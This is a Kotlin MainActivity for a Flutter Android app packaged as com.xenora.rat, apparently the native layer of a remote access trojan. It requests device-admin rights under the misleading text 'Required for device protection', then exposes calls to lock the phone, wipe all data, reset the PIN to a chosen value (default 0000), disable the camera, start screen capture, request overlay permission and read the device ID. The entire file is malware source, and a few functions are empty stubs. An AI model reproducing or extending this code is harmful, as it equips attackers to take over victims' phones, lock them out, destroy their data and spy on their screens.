// android/app/src/main/kotlin/com/xenora/rat/MainActivity.kt
package com.xenora.rat

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.media.projection.MediaProjectionManager
import androidx.annotation.NonNull
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import io.flutter.plugin.common.MethodChannel.Result

class MainActivity : FlutterActivity() {
    private val CHANNEL_DEVICE_ADMIN = "device_admin"
    private val CHANNEL_SCREEN_CAPTURE = "screen_capture"
    private val CHANNEL_PERMISSIONS = "permissions"
    private val CHANNEL_DEVICE_INFO = "device_info"

    private lateinit var devicePolicyManager: DevicePolicyManager
    private lateinit var adminComponent: ComponentName
    private var mediaProjectionManager: MediaProjectionManager? = null

    companion object {
        const val REQUEST_SCREEN_CAPTURE = 1001
        const val REQUEST_ADMIN = 1002
        var pendingResult: MethodChannel.Result? = null
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Device Admin
        devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        adminComponent = ComponentName(this, DeviceAdminReceiver::class.java)
        
        // Screen Capture
        mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
    }

    override fun configureFlutterEngine(@NonNull flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        // ── Device Admin Channel ──
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL_DEVICE_ADMIN)
            .setMethodCallHandler { call, result ->
                when (call.method) {
                    "isAdminActive" -> isAdminActive(result)
                    "enableAdmin" -> enableAdmin(result)
                    "lockDevice" -> lockDevice(result)
                    "wipeData" -> wipeData(result)
                    "isDeviceLocked" -> isDeviceLocked(result)
                    "resetPassword" -> {
                        val pin = call.argument<String>("pin") ?: "0000"
                        resetPassword(pin, result)
                    }
                    "disableCamera" -> disableCamera(result)
                    "enableCamera" -> enableCamera(result)
                    else -> result.notImplemented()
                }
            }

        // ── Screen Capture Channel ──
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL_SCREEN_CAPTURE)
            .setMethodCallHandler { call, result ->
                when (call.method) {
                    "startScreenCapture" -> startScreenCapture(result)
                    "stopScreenCapture" -> stopScreenCapture(result)
                    "isScreenCaptureActive" -> isScreenCaptureActive(result)
                    else -> result.notImplemented()
                }
            }

        // ── Permissions Channel ──
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL_PERMISSIONS)
            .setMethodCallHandler { call, result ->
                when (call.method) {
                    "requestOverlayPermission" -> requestOverlayPermission(result)
                    "isOverlayPermissionGranted" -> isOverlayPermissionGranted(result)
                    "requestAllPermissions" -> requestAllPermissions(result)
                    else -> result.notImplemented()
                }
            }

        // ── Device Info Channel ──
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL_DEVICE_INFO)
            .setMethodCallHandler { call, result ->
                when (call.method) {
                    "getDeviceId" -> getDeviceId(result)
                    "getAndroidId" -> getAndroidId(result)
                    "getModel" -> getModel(result)
                    else -> result.notImplemented()
                }
            }
    }

    // ============================================================
    //  DEVICE ADMIN
    // ============================================================
    private fun isAdminActive(result: Result) {
        val isActive = devicePolicyManager.isAdminActive(adminComponent)
        result.success(isActive)
    }

    private fun enableAdmin(result: Result) {
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for device protection")
        startActivityForResult(intent, REQUEST_ADMIN)
        result.success(true)
    }

    private fun lockDevice(result: Result) {
        if (devicePolicyManager.isAdminActive(adminComponent)) {
            devicePolicyManager.lockNow()
            result.success(true)
        } else {
            result.success(false)
        }
    }

    private fun wipeData(result: Result) {
        if (devicePolicyManager.isAdminActive(adminComponent)) {
            devicePolicyManager.wipeData(DevicePolicyManager.WIPE_RESET_PROTECTION_DATA)
            result.success(true)
        } else {
            result.success(false)
        }
    }

    private fun isDeviceLocked(result: Result) {
        val isLocked = devicePolicyManager.isAdminActive(adminComponent) &&
                devicePolicyManager.isDeviceLocked
        result.success(isLocked)
    }

    private fun resetPassword(pin: String, result: Result) {
        if (devicePolicyManager.isAdminActive(adminComponent)) {
            val success = devicePolicyManager.resetPassword(pin, DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY)
            result.success(success)
        } else {
            result.success(false)
        }
    }

    private fun disableCamera(result: Result) {
        if (devicePolicyManager.isAdminActive(adminComponent)) {
            devicePolicyManager.setCameraDisabled(adminComponent, true)
            result.success(true)
        } else {
            result.success(false)
        }
    }

    private fun enableCamera(result: Result) {
        if (devicePolicyManager.isAdminActive(adminComponent)) {
            devicePolicyManager.setCameraDisabled(adminComponent, false)
            result.success(true)
        } else {
            result.success(false)
        }
    }

    // ============================================================
    //  SCREEN CAPTURE
    // ============================================================
    private fun startScreenCapture(result: Result) {
        if (mediaProjectionManager == null) {
            result.error("ERROR", "MediaProjectionManager not available", null)
            return
        }
        pendingResult = result
        val intent = mediaProjectionManager!!.createScreenCaptureIntent()
        startActivityForResult(intent, REQUEST_SCREEN_CAPTURE)
    }

    private fun stopScreenCapture(result: Result) {
        // Stop capture via service
        result.success(true)
    }

    private fun isScreenCaptureActive(result: Result) {
        // Check if screen capture is active
        result.success(false)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        
        if (requestCode == REQUEST_SCREEN_CAPTURE) {
            if (resultCode == RESULT_OK && data != null) {
                pendingResult?.success(mapOf(
                    "success" to true,
                    "resultCode" to resultCode,
                    "data" to data
                ))
            } else {
                pendingResult?.error("CANCELLED", "Screen capture cancelled", null)
            }
            pendingResult = null
        }
    }

    // ============================================================
    //  PERMISSIONS
    // ============================================================
    private fun requestOverlayPermission(result: Result) {
        val intent = Intent(
            Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
            android.net.Uri.parse("package:$packageName")
        )
        startActivity(intent)
        result.success(true)
    }

    private fun isOverlayPermissionGranted(result: Result) {
        val granted = Settings.canDrawOverlays(this)
        result.success(granted)
    }

    private fun requestAllPermissions(result: Result) {
        // All permissions already requested via manifest
        result.success(true)
    }

    // ============================================================
    //  DEVICE INFO
    // ============================================================
    private fun getDeviceId(result: Result) {
        try {
            val id = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
            result.success(id ?: "unknown")
        } catch (e: Exception) {
            result.error("ERROR", e.message, null)
        }
    }

    private fun getAndroidId(result: Result) {
        try {
            val id = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
            result.success(id ?: "unknown")
        } catch (e: Exception) {
            result.error("ERROR", e.message, null)
        }
    }

    private fun getModel(result: Result) {
        result.success(android.os.Build.MODEL)
    }
}